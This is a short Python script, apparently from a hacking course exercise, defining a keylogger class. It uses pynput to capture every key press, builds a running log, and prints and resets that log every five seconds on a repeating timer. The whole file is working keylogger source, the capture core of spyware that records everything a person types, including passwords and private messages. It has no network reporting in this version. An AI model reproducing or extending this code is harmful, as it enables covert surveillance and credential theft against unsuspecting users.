#!/usr/bin/env python
import pynput.keyboard
import threading


class KeyLog():
    def __init__(self): #This code is executed automatically when the oject is created.
        self.log = "" #Attribute

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char) #need to treat this object as a string.
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key) #Need to be aware of the indenting the code.

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report) #Setting a timer. #Allows you to continue a running a fucntion.
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press =self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
